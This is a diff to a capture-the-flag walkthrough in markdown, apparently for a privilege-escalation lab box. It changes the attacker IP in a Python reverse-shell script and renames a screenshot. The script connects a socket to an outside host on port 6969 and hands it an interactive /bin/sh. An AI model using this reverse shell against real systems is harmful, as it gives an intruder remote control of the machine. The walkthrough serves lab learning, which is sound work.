@@ -129,14 +129,14 @@ $ stty rows <num> columns <cols>
 #!/usr/bin/env python
 import socket, os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.8.61.214", 6969))
+s.connect(("10.0.0.0", 6969))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 os.system("/bin/sh -i")
 ```
 
-# ![19](images/pyhscr.jpg?raw=true "secsc")
+# ![19](images/pyhscr(1).jpg?raw=true "secsc")
 
 + **And we are root! It was a funny box, we made some important and classical privilege escalation actions and thousands of thanks should go to csenox, the creator of this box!**
 
